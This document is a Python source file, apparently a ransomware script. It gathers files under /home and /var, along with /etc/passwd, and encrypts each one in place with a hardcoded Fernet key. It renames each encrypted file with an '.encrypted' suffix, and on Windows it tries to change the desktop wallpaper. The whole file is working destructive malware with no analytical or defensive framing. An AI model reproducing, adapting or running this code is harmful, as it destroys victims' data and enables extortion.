import subprocess
from cryptography.fernet import Fernet
import os
import threading
import base64
import sys

DONT = os.path.join(os.getcwd(), 'ransomware.py')

FILES = ['/etc/passwd']
DIRS = ['/home', '/var']
ALREADY = []
lock = threading.Lock()
key = b'58LJVj3DSUSZa1c-pU6kqf8M67HLtd_F6HmoLpCUk2o='
fernet = Fernet(key)


def wallpaper():
        if sys.platform == 'win32':
                image = b''
                name = 'ENCWP.jpg'
                open(name, 'wb').write(base64.b64decode(image))
                image_path = os.path.join(os.getcwd(), name)

                import ctypes
                SPI_SETDESKWALLPAPER = 20 
                ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, image_path , 0)
        return


def encrypt_file(path):
        if path == DONT or path == 'ransomware.py':
                return
        try:
                with open(path, 'rb') as f:
                        dec_data = f.read()
                enc_data = fernet.encrypt(dec_data)
                with open(path, 'wb') as f:
                        f.write(enc_data)
                os.rename(path, path+'.encrypted')
        except PermissionError:
                None


def listdir(path):
        global DIRS
        global FILES
        global lock
        try:
                #print (os.listdir(path))
                for file in os.listdir(path):
                        full = os.path.join(path, file)
                        if os.path.isfile(full):
                                with lock:
                                        FILES.append(full)
                        elif os.path.isdir(full):
                                with lock:
                                        DIRS.append(full)
        except PermissionError:
                None


wallpaper()

if len(DIRS) >= 0:
        threads = []
        for d in DIRS:
                if d in ALREADY:
                        continue
                t = threading.Thread(target=listdir, args=(d,))
                t.start()
                DIRS.remove(d)

        for t in threads:
                t.join()

ts = []
for f in FILES:
        t = threading.Thread(target=encrypt_file, args=(f,))
        t.start()

        ts.append(t)
for t in ts:
        t.join()
                   
